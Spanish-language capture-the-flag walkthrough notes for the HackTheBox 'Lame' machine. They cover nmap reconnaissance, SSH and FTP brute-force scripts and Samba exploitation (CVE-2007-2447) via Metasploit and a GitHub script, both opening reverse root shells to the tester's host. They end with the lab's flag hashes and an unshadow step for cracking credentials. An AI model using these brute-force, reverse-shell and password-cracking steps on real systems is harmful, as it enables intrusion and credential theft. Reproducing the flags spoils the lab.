@@ -1,0 +1,411 @@
+		LAME 10.10.10.3
+
++++++ INFORMACION ENTREGADA:+++++++++++++++++++++++++++++++++++++++++++++++++
+
+	Nombre: Lame
+	Sistema Operativo: Linux
+	Dificultad: fácil
+	IP: 10.10.10.3
+
++++++ RECOLECION DE INFORMACION++++++++++++++++++++++++++++++++++++++++++++++
+
+-- PUERTOS:
+NMAP -P- -Pn 10.10.10.3
+
+NMAP -sC -sV -A -p21,22,138,445,3632 10.10.10.3 -o nmapTCP.txt
+
+	PORT     STATE    SERVICE     VERSION
+	21/tcp   open     ftp         vsftpd 2.3.4
+	|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+	| ftp-syst: 
+	|   STAT: 
+	| FTP server status:
+	|      Connected to 10.10.14.4
+	|      Logged in as ftp
+	|      TYPE: ASCII
+	|      No session bandwidth limit
+	|      Session timeout in seconds is 300
+	|      Control connection is plain text
+	|      Data connections will be plain text
+	|      vsFTPd 2.3.4 - secure, fast, stable
+	|_End of status
+
+	22/tcp   open     ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+	| ssh-hostkey: 
+	|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+	|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+
+	138/tcp  filtered netbios-dgm
+
+	445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+
+	3632/tcp open     distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+
+NMAP -sU  10.10.10.3 
+NMAP -sU -sC -sV -p22,139,445 10.10.10.3 -o nmapUDP.txt								
+
+	22/udp  closed ssh
+	139/udp closed netbios-ssn
+	445/udp closed microsoft-ds
+
+
+
+-- Busqueda de version de Samba.
+enum4linux -o 10.10.10.3
+   ==================================== 
+  |    OS information on 10.10.10.3    |
+  ==================================== 
+  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
+  Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+  [+] Got OS info for 10.10.10.3 from smbclient: 
+  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
+  [+] Got OS info for 10.10.10.3 from srvinfo:
+          LAME           Wk Sv PrQ Unx NT SNT lame server (Samba 3.0.20-Debian)
+          platform_id     :       500
+          os version      :       4.9
+          server type     :       0x9a03																				 
+
+
+------RESUMEN DE LA INFORMACION OBTENIDA-------------------------------------
+
+	Puerto 21		Protocolo:TCP	Servicio:ftp		Version: vsftpd 2.3.4
+	Puerto 22		Procololo:TCP	Servicio:ssh 		Version: Openssh 4.7p1 
+	Puerto 138		Protocolo:TCP	Servicio:netbios 	Version: Samba 3.0.20
+	Puerto 445		Protocolo:TCP	Servicio:netbios 	Version: Samba 3.0.20
+	Puerto 3632		Protocolo:TCP	Servicio:distccd	Version: Distccd v1    
+
+	Puerto 22		Procololo:UDP	Servicio:ssh 		Version: Openssh 4.7p1 
+	Puerto 138		Protocolo:UDP	Servicio:netbios 	Version: Samba 3.0.20
+	Puerto 445		Protocolo:UDP	Servicio:netbios 	Version: microsoft-ds
+
+++++++ FASE DE ANALISIS DE VULNERAVILIDADES +++++++++++++++++++++++++++++++++
+
+------ FTP: Conexion ftp por el puerto 21 -----
+																		  
+-- Prueba acceso con usuario anonymous:
+	Acceso con usuario anonymous y password (cualquier cosa)
+    Consigo acceder a un directorio vacio.
+
+--Script Nmap:
+   nmap -p21 --script=ftp-anon.nse 10.10.10.3
+   nmap -p21 --script=ftp-brute.nse 10.10.10.3 
+   nmap -p21 --script=ftp-bounce.nse 10.10.10.3
+
+   Nos muestra posible acceso con usuario anonymous - anonymous
+   
+-- Con el comandos searchsploit, busco por vsftpd 2.3.4:   
+	Solo hay este: vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)  
+								  
+----- SSH: Conexion ssh por el puerto 22 -----
+
+-- Con el comandos searchsploit, busco por Openssh:
+
+	No hay ninguno
+
+-- Con nmap ejecuto script de ssh.
+
+	nmap -p 22 --script ssh-auth-methods 10.10.10.3
+		PORT   STATE SERVICE
+		22/tcp open  ssh
+		| ssh-auth-methods: 
+		|   Supported authentication methods: 
+		|     publickey
+		|_    password
+
+	nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<username>" 10.10.10.3
+	nmap -p 22 --script ssh-brute 10.10.10.3
+		PORT   STATE SERVICE
+		22/tcp open  ssh
+		| ssh-brute: 
+		|   Accounts: No valid accounts found
+		|_  Statistics: Performed 242 guesses in 600 seconds, average tps: 0.4
+
+	
+	nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst \ --script-args ssh-brute.timeout=4s 10.10.10.3
+	nmap -p 22 --script ssh-hostkey 10.10.10.3
+		PORT   STATE SERVICE
+		22/tcp open  ssh
+		| ssh-hostkey: 
+		|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+		|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+
+	nmap -p 22 --script ssh-publickey-acceptance 10.10.10.3
+		PORT   STATE SERVICE
+		22/tcp open  ssh
+		| ssh-publickey-acceptance: 
+		|_  Accepted Public Keys: No public keys accepted
+	
+	nmap -p 22 --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user'}, ssh.privatekeys={'./id_rsa1', './id_rsa2'}" 10.10.10.3
+	nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root", "user"}, publickeys={"./id_rsa1.pub", "./id_rsa2.pub"}' 10.10.10.3
+	nmap -p 22 --script ssh-run.cmd=ls -l 10.10.10.3
+	nmap -p 22 --script ssh2-enum-algos 10.10.10.3
+		PORT   STATE SERVICE
+		22/tcp open  ssh
+		| ssh2-enum-algos: 
+		|   kex_algorithms: (4)
+		|       diffie-hellman-group-exchange-sha256
+		|       diffie-hellman-group-exchange-sha1
+		|       diffie-hellman-group14-sha1
+		|       diffie-hellman-group1-sha1
+		|   server_host_key_algorithms: (2)
+		|       ssh-rsa
+		|       ssh-dss
+		|   encryption_algorithms: (13)
+		|       aes128-cbc
+		|       3des-cbc
+		|       blowfish-cbc
+		|       cast128-cbc
+		|       arcfour128
+		|       arcfour256
+		|       arcfour
+		|       aes192-cbc
+		|       aes256-cbc
+		|       rijndael-cbc@lysator.liu.se
+		|       aes128-ctr
+		|       aes192-ctr
+		|       aes256-ctr
+		|   mac_algorithms: (7)
+		|       hmac-md5
+		|       hmac-sha1
+		|       umac-64@openssh.com
+		|       hmac-ripemd160
+		|       hmac-ripemd160@openssh.com
+		|       hmac-sha1-96
+		|       hmac-md5-96
+		|   compression_algorithms: (2)
+		|       none
+		|_      zlib@openssh.com
+
+	nmap -p 22 --script sshv1 10.10.10.10					  
+		PORT   STATE SERVICE
+		22/tcp open  ssh
+
+----- SAMBA: Conexion Samba por el puerto 445 -----
+
+-- Utiliza la herramienta smbsamba:
+	smbmap -H 10.10.10.3
+	[+] Finding open SMB ports....
+	[+] User SMB session established on 10.10.10.3...
+	[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
+        Disk		Permissions     Comment
+        ----		-----------     -------
+        print$		NO ACCESS       Printer Drivers
+        tmp			READ, WRITE     oh noes!
+        opt			NO ACCESS
+        IPC$		NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+        ADMIN$		NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+
+-- Utiliza script de nmap "smb-vuln"								
+
+	nmap --script=smb-vuln-conficker 10.10.10.3
+		PORT    STATE SERVICE
+		21/tcp  open  ftp
+		22/tcp  open  ssh
+		139/tcp open  netbios-ssn
+		445/tcp open  microsoft-ds
+
+	nmap --script=smb-vuln-cve-2017-7494 10.10.10.3
+		PORT    STATE SERVICE
+		21/tcp  open  ftp
+		22/tcp  open  ssh
+		139/tcp open  netbios-ssn
+		445/tcp open  microsoft-ds
+		Host script results:
+		|_smb-vuln-cve-2017-7494: ERROR: Script execution failed (use -d to debug)
+	
+	nmap --script=smb-vuln-cve2009-3103 10.10.10.3
+		PORT    STATE SERVICE
+		21/tcp  open  ftp
+		22/tcp  open  ssh
+		139/tcp open  netbios-ssn
+		445/tcp open  microsoft-ds
+		
+	nmap --script=smb-vuln-ms06-025 10.10.10.3
+		PORT    STATE SERVICE
+		21/tcp  open  ftp
+		22/tcp  open  ssh
+		139/tcp open  netbios-ssn
+		445/tcp open  microsoft-ds
+		Host script results:
+		|_smb-vuln-ms06-025: ERROR: Script execution failed (use -d to debug)
+		
+	nmap --script=smb-vuln-ms07-029 10.10.10.3
+		PORT    STATE SERVICE
+		21/tcp  open  ftp
+		22/tcp  open  ssh
+		139/tcp open  netbios-ssn
+		445/tcp open  microsoft-ds
+		Host script results:
+		|_smb-vuln-ms07-029: ERROR: Script execution failed (use -d to debug)
+
+	nmap --script=smb-vuln-ms08-067 10.10.10.3
+		PORT    STATE SERVICE
+		21/tcp  open  ftp
+		22/tcp  open  ssh
+		139/tcp open  netbios-ssn
+		445/tcp open  microsoft-ds
+		Host script results:
+		|_smb-vuln-ms08-067: ERROR: Script execution failed (use -d to debug)
+
+	nmap --script=smb-vuln-ms10-054 10.10.10.3
+		PORT    STATE SERVICE
+		21/tcp  open  ftp
+		22/tcp  open  ssh
+		139/tcp open  netbios-ssn
+		445/tcp open  microsoft-ds
+		Host script results:
+		|_smb-vuln-ms10-054: false
+
+	nmap --script=smb-vuln-ms10-061 10.10.10.3
+		PORT    STATE SERVICE
+		21/tcp  open  ftp
+		22/tcp  open  ssh
+		139/tcp open  netbios-ssn
+		445/tcp open  microsoft-ds
+		Host script results:
+		|_smb-vuln-ms10-061: false
+
+	nmap --script=smb-vuln-ms17-010 10.10.10.3
+		PORT    STATE SERVICE
+		21/tcp  open  ftp
+		22/tcp  open  ssh
+		139/tcp open  netbios-ssn
+		445/tcp open  microsoft-ds
+		Host script results:
+		|_smb-vuln-ms17-010: ERROR: Script execution failed (use -d to debug)
+		
+	nmap --script=smb-vuln-regsvc-dos 10.10.10.3
+		PORT    STATE SERVICE
+		21/tcp  open  ftp
+		22/tcp  open  ssh
+		139/tcp open  netbios-ssn
+		445/tcp open  microsoft-ds
+		Host script results:
+		|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
+	
+	nmap --script=smb-vuln-webexec 10.10.10.3
+		PORT    STATE SERVICE
+		21/tcp  open  ftp
+		22/tcp  open  ssh
+		139/tcp open  netbios-ssn
+		|_smb-vuln-webexec: ERROR: Script execution failed (use -d to debug)
+		445/tcp open  microsoft-ds
+		|_smb-vuln-webexec: ERROR: Script execution failed (use -d to debug)
+
+-- Utiliza la herramienta smbclient:
+
+	smbclient -L \\\\10.10.10.3\\							
+
+	smbclient \\\\10.10.10.3\\ (Password: Anonymous)		
+	smbclient \\\\10.10.10.3\\tmp							
+	smb: \> ls												
+	smb: \> exit											
+
+	smbclient \\\\10.10.10.3\\opt (Falta permisos)			
+
+	(No consigo mas informacion)
+
+- Con el comando searchsploit busca samba 3.0.20  
+	searchsploit Samba 3.0.20
+	Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)             | exploits/unix/remote/16320.rb
+	Samba < 3.0.20 - Remote Heap Overflow
+
+(Nos muestra 2 exploit)
+
+++++++ FASE DE EXPLOTACION ++++++++++++++++++++++++++++++++++++++++++++++++++
+
+-- FTP: Conexion ftp por el puerto 21:
+	Acceso con usuario anonymous - anonymous
+	Consigue acceder pero no muestra ningun fichero ni directorio.
+
++ Exploit: https://github.com/In2econd/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py
+	Copia la fuente, dar permisos chmod +x y ejecutar:
+	python3 vsftpd_234_exploit.py  10.10.10.3 21 pwd
+	(NO FUNCIONA)
+
++ Con la aplicacion msfconsole comprueba exploit para FTP.
+	
+	# msfconsole
+	msf5 > search vsftpd 2.3.4
+	auxiliary/gather/teamtalk_creds 
+	exploit/multi/http/oscommerce_installer_unauth_code_exec 
+	exploit/multi/http/struts2_namespace_ognl    
+	exploit/unix/ftp/vsftpd_234_backdoor 
+
+	Comprueba el exploit "exploit/unix/ftp/vsftpd_234_backdoor" 
+	msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
+	msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.3
+	msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+	
+	[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
+	[*] 10.10.10.3:21 - USER: 331 Please specify the password.
+	[*] Exploit completed, but no session was created.Flaga
+	(NO FUNCIONA)
+
+/////////////// SSH: Conexion por el puerto 22. Version: Openssh 4.7p1
+
++ Buscar algun exploit con searchsploit no hay ninguna para la version instalada.
+ 
+
+-- SAMBA: Conexion Samba por el puerto 445: Version: 3.0.20 
+
+
+///////////////////////////////////////   OPCION 1    ////////////////////
+		
++ Exploit para samba 3.0.20  (CVE-2007-2447) 
+
+msf5 exploit(multi/samba/usermap_script) > use exploit/multi/samba/usermap_script
+msf5 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
+msf5 exploit(multi/samba/usermap_script) > exploit
+[*] Started reverse TCP double handler on 10.10.14.4:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo XiNi5UcGbOi6DOB5;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "XiNi5UcGbOi6DOB5\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.4:4444 -> 10.10.10.3:48924) at 2020-02-24 10:00:50 +0100
+
+CONSEGUIR UNA SHELL DE ROOT.
+
+Para mejorar la shell, ejecutar:
+/bin/bash -i
+python -c 'import pty; pty.spaw( "/bin/bash")'
+
+///////////////////////////////////////   OPCION 2    //////////////////// 
+
+Descargar de la web: https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py
+Descargar: usermap_script.py y ejecuto:
+python usermap_script.py 10.10.10.3 445 10.10.14.10 4444
+En otra consola ejecutar: nc -lvnp 4444
+En la consola de nc se consiue acceso como usuario root:
+listening on [any] 4444 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.3] 43814
+whoami
+root
+
+
+* Si no funciona, es que requiere librerias; Ejecutar pip install python-smb  o pip install pysmb o pip install smbprotocol
+
+
+
+++ FASE DE POSTEXPLOTACION +++++++++++++++++++++++++++++++++++++++++++++++
+
+whoami
+root
+
+FLAG:
+cat /home/makis/user.txt
+69454a937d94f5f0225ea00acd2e84c5
+
+
+FLAG:
+cat /root/root.txt
+92caac3be140ef409e45721348a4e9df
+
+unshadown  passwd shadow
+
